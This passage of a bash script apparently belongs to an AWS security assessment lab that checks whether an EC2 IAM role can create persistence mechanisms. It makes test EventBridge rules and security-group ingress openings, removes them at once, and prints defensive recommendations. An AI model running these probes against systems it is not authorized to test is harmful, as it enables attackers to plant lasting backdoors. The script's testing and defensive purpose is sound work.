# persistent backdoor: it fires on a schedule regardless of EC2 state and
# can invoke Lambda, SSM Run Command, SNS, SQS, or ECS tasks.
# Rules persist until explicitly deleted.
# =============================================================================
print_header "Step 7: EventBridge Rule Creation Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 7: EventBridge Rule Creation Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Testing events:PutRule permission${NC}"
echo -e "${BLUE}[*] Scheduled EventBridge rules fire regardless of EC2 state — persistent backdoor${NC}"
echo ""

_l2_eb_rule_name="persistence-test-DO-NOT-USE-$(date +%s)"
put_rule_result=$(aws events put-rule \
    --name "${_l2_eb_rule_name}" \
    --schedule-expression "rate(1 day)" \
    --description "persistence-test-DO-NOT-USE — safe to delete" \
    --state DISABLED \
    --output json 2>&1) || true

if echo "${put_rule_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "events:PutRule — Cannot create scheduled EventBridge backdoor rules"
    _l2_eb_rule_name=""
    MECH_NAMES+=("EventBridge Rule")
    MECH_STATUS+=("DENIED")
    MECH_RISK+=("MEDIUM")
elif echo "${put_rule_result}" | grep -qi "RuleArn\|arn:aws:events"; then
    rule_arn=$(echo "${put_rule_result}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('RuleArn',''))" 2>/dev/null || echo "")
    record_possible "events:PutRule — Permission GRANTED (rule ARN: ${rule_arn})"
    MECH_NAMES+=("EventBridge Rule")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("MEDIUM")
    echo -e "${YELLOW}  [!] Deleting test EventBridge rule immediately${NC}"
    aws events delete-rule --name "${_l2_eb_rule_name}" 2>/dev/null || true
    _l2_eb_rule_name=""
else
    record_unknown "events:PutRule — Response: ${put_rule_result:0:150}"
    _l2_eb_rule_name=""
    MECH_NAMES+=("EventBridge Rule")
    MECH_STATUS+=("UNKNOWN")
    MECH_RISK+=("MEDIUM")
fi

echo ""

# =============================================================================
# Step 8: Security Group Modification Check
# =============================================================================
# Modifying a security group to open a custom port (e.g., a non-standard SSH
# port or a reverse-shell listener port) provides a persistent network backdoor.
# The rule survives EC2 reboots and remains until explicitly removed.
# =============================================================================
print_header "Step 8: Security Group Modification Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 8: Security Group Modification Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Testing ec2:AuthorizeSecurityGroupIngress permission${NC}"
echo -e "${BLUE}[*] Opening a custom port persists across EC2 reboots — network backdoor${NC}"
echo ""

# Get the security group ID associated with the current instance
sg_id=""
if [[ -n "${instance_id}" ]]; then
    desc_sg_result=$(aws ec2 describe-instances \
        --instance-ids "${instance_id}" \
        --query "Reservations[0].Instances[0].SecurityGroups[0].GroupId" \
        --output text 2>&1) || desc_sg_result=""
    if ! echo "${desc_sg_result}" | grep -qi "AccessDenied\|error\|None"; then
        sg_id="${desc_sg_result}"
    fi
fi

# Fall back to listing all security groups
if [[ -z "${sg_id}" ]]; then
    echo -e "${YELLOW}[*] Falling back to ec2:DescribeSecurityGroups to find a probe target${NC}"
    sg_list_result=$(aws ec2 describe-security-groups --output json 2>&1) || sg_list_result=""
    if ! echo "${sg_list_result}" | grep -qi "AccessDenied\|is not authorized"; then
        sg_id=$(echo "${sg_list_result}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    sgs = data.get('SecurityGroups', [])
    if sgs:
        print(sgs[0]['GroupId'])
except: pass
" 2>/dev/null || echo "")
    fi
fi

if [[ -n "${sg_id}" ]]; then
    echo -e "${BLUE}[*] Probing ec2:AuthorizeSecurityGroupIngress on ${sg_id}${NC}"
    _l2_sg_id="${sg_id}"
    auth_sg_result=$(aws ec2 authorize-security-group-ingress \
        --group-id "${sg_id}" \
        --protocol tcp \
        --port 19998 \
        --cidr 203.0.113.0/32 \
        --output json 2>&1) || true

    if echo "${auth_sg_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
        record_denied "ec2:AuthorizeSecurityGroupIngress — Cannot add backdoor firewall rules"
        _l2_sg_id=""
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("DENIED")
        MECH_RISK+=("HIGH")
    elif echo "${auth_sg_result}" | grep -qi "InvalidPermission.Duplicate"; then
        # Rule already exists from a prior run — permission is confirmed
        record_possible "ec2:AuthorizeSecurityGroupIngress — Permission GRANTED (duplicate rule; removing now)"
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("HIGH")
        aws ec2 revoke-security-group-ingress \
            --group-id "${sg_id}" \
            --protocol tcp --port 19998 --cidr 203.0.113.0/32 2>/dev/null || true
        _l2_sg_id=""
    elif echo "${auth_sg_result}" | grep -qi "Return.*true\|SecurityGroupRules\|GroupId\|\"true\"" || [[ -z "${auth_sg_result}" ]]; then
        _l2_sg_rule_created=true
        record_possible "ec2:AuthorizeSecurityGroupIngress — Permission GRANTED (rule added; revoking now)"
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("HIGH")
        aws ec2 revoke-security-group-ingress \
            --group-id "${sg_id}" \
            --protocol tcp --port 19998 --cidr 203.0.113.0/32 2>/dev/null || true
        _l2_sg_rule_created=false
        _l2_sg_id=""
    else
        record_unknown "ec2:AuthorizeSecurityGroupIngress — Response: ${auth_sg_result:0:150}"
        _l2_sg_id=""
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("UNKNOWN")
        MECH_RISK+=("HIGH")
    fi
else
    echo -e "${YELLOW}[*] No security group ID available — probing with dummy SG ID${NC}"
    dummy_sg_result=$(aws ec2 authorize-security-group-ingress \
        --group-id "sg-00000000000000000" \
        --protocol tcp \
        --port 19998 \
        --cidr 203.0.113.0/32 \
        --output json 2>&1) || true
    if echo "${dummy_sg_result}" | grep -qi "AccessDenied\|is not authorized"; then
        record_denied "ec2:AuthorizeSecurityGroupIngress — Cannot add backdoor firewall rules"
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("DENIED")
        MECH_RISK+=("HIGH")
    elif echo "${dummy_sg_result}" | grep -qi "InvalidGroup.NotFound\|does not exist"; then
        record_possible "ec2:AuthorizeSecurityGroupIngress — Permission GRANTED (invalid SG used for probe)"
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("HIGH")
    else
        record_unknown "ec2:AuthorizeSecurityGroupIngress — No SG available; response: ${dummy_sg_result:0:150}"
        MECH_NAMES+=("Security Group Modification")
        MECH_STATUS+=("UNKNOWN")
        MECH_RISK+=("HIGH")
    fi
fi

echo ""

# =============================================================================
# Step 9: Summary Table and Overall Verdict
# =============================================================================
print_header "Step 9: Persistence Mechanism Summary"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 9: Summary and Verdict"$'\n'
result_text+="==============================="$'\n'

echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  Persistence Mechanism Summary  [${CONFIG_LABEL}]${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
printf "  ${BOLD}%-36s %-12s %s${NC}\n" "Persistence Mechanism" "Permission" "Risk Level"
echo -e "  ──────────────────────────────────────────────────────────────────────────"

critical_possible=0
total_mechs=${#MECH_NAMES[@]}

for (( i=0; i<total_mechs; i++ )); do
    mech_name="${MECH_NAMES[$i]}"
    mech_status="${MECH_STATUS[$i]}"
    mech_risk="${MECH_RISK[$i]}"

    case "${mech_status}" in
        POSSIBLE)
            status_colored="${RED}POSSIBLE${NC}"
            if [[ "${mech_risk}" == "CRITICAL" ]]; then
                ((critical_possible++)) || true
            fi
            ;;
        DENIED)
            status_colored="${GREEN}DENIED${NC}"
            ;;
        UNKNOWN)
            status_colored="${YELLOW}UNKNOWN${NC}"
            ;;
        *)
            status_colored="${YELLOW}${mech_status}${NC}"
            ;;
    esac

    case "${mech_risk}" in
        CRITICAL) risk_colored="${RED}${mech_risk}${NC}" ;;
        HIGH)     risk_colored="${RED}${mech_risk}${NC}" ;;
        MEDIUM)   risk_colored="${YELLOW}${mech_risk}${NC}" ;;
        *)        risk_colored="${GREEN}${mech_risk}${NC}" ;;
    esac

    printf "  %-36s " "${mech_name}"
    echo -e "${status_colored}       ${risk_colored}"

    result_text+="  $(printf '%-36s' "${mech_name}") ${mech_status}  ${mech_risk}"$'\n'
done

echo -e "  ──────────────────────────────────────────────────────────────────────────"
echo -e "  Persistence Risk: ${POSSIBLE_COUNT}/${total_mechs} mechanisms available"
echo ""

result_text+="Persistence Risk: ${POSSIBLE_COUNT}/${total_mechs} mechanisms available"$'\n'
result_text+="POSSIBLE: ${POSSIBLE_COUNT}  DENIED: ${DENIED_COUNT}  UNKNOWN: ${UNKNOWN_COUNT}"$'\n'

# Core educational message
echo -e "${RED}${BOLD}  ══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}${BOLD}  KEY FINDING: Persistence mechanisms are 100% IAM-dependent${NC}"
echo -e "${RED}${BOLD}  Moving EC2 to a private subnet has ZERO effect on persistence${NC}"
echo -e "${RED}${BOLD}  The same IAM role grants the same permissions regardless of topology${NC}"
echo -e "${RED}${BOLD}  ══════════════════════════════════════════════════════════════════════${NC}"
echo ""

result_text+=$'\n'"KEY FINDING: Persistence mechanisms are 100% IAM-dependent."$'\n'
result_text+="Moving EC2 to a private subnet has ZERO effect on persistence capability."$'\n'
result_text+="The same IAM role grants the same permissions regardless of network topology."$'\n'

echo -e "${BOLD}  Recommended Defenses:${NC}"
echo ""
echo -e "  1. ${CYAN}IAM Least Privilege${NC}"
echo -e "     -> Remove iam:Create*, lambda:CreateFunction, events:PutRule from EC2 role"
echo ""
echo -e "  2. ${CYAN}SCP (Service Control Policies)${NC}"
echo -e "     -> Block dangerous persistence actions at the organization level"
echo ""
echo -e "  3. ${CYAN}CloudTrail + GuardDuty${NC}"
echo -e "     -> Alert on iam:CreateUser, iam:CreateAccessKey, lambda:CreateFunction"
echo -e "     -> GuardDuty detects anomalous credential usage patterns"
echo ""
echo -e "  4. ${CYAN}Enforce IMDSv2${NC} (http_tokens = 'required')"
echo -e "     -> Prevents SSRF from stealing the IAM credentials in the first place"
echo ""
echo -e "  5. ${CYAN}Regular credential rotation + access key auditing${NC}"
echo -e "     -> aws iam list-access-keys to detect unauthorized keys"
echo ""
echo -e "  6. ${CYAN}AWS Config Rules${NC}"
echo -e "     -> Monitor for unauthorized IAM users, Lambda functions, and SG changes"
echo ""

result_text+=$'\n'"Recommended Defenses:"$'\n'
result_text+="1. IAM Least Privilege (remove iam:Create*, lambda:CreateFunction, events:PutRule)"$'\n'
result_text+="2. SCP (Service Control Policies) blocking persistence actions org-wide"$'\n'
result_text+="3. CloudTrail + GuardDuty for anomaly detection on credential usage"$'\n'
result_text+="4. Enforce IMDSv2 (http_tokens = 'required') to block credential theft via SSRF"$'\n'
result_text+="5. Regular credential rotation + aws iam list-access-keys auditing"$'\n'
result_text+="6. AWS Config Rules monitoring unauthorized IAM, Lambda, SG changes"$'\n'

# Overall verdict
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  Persistence Check Final Verdict (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if [[ ${POSSIBLE_COUNT} -gt 0 ]] && [[ ${critical_possible} -gt 0 ]]; then
    print_vulnerable "VERDICT: VULNERABLE — ${POSSIBLE_COUNT} persistence mechanism(s) available including ${critical_possible} CRITICAL"
    result_text+=$'\n'"VERDICT: VULNERABLE — ${POSSIBLE_COUNT} mechanism(s) available (${critical_possible} CRITICAL)"$'\n'
elif [[ ${POSSIBLE_COUNT} -gt 0 ]]; then
    print_vulnerable "VERDICT: VULNERABLE — ${POSSIBLE_COUNT} persistence mechanism(s) available (non-critical)"
    result_text+=$'\n'"VERDICT: VULNERABLE — ${POSSIBLE_COUNT} non-critical mechanism(s) available"$'\n'
elif [[ ${UNKNOWN_COUNT} -gt 0 ]] && [[ ${DENIED_COUNT} -eq 0 ]]; then
    print_info "VERDICT: INCONCLUSIVE — All checks returned UNKNOWN; manual verification required"
    result_text+=$'\n'"VERDICT: INCONCLUSIVE — Cannot determine persistence capability"$'\n'
else
    print_blocked "VERDICT: BLOCKED — No persistence mechanisms confirmed available"
    result_text+=$'\n'"VERDICT: BLOCKED — No persistence mechanisms confirmed available"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "Persistence mechanism check complete — ${POSSIBLE_COUNT}/${total_mechs} mechanisms available"
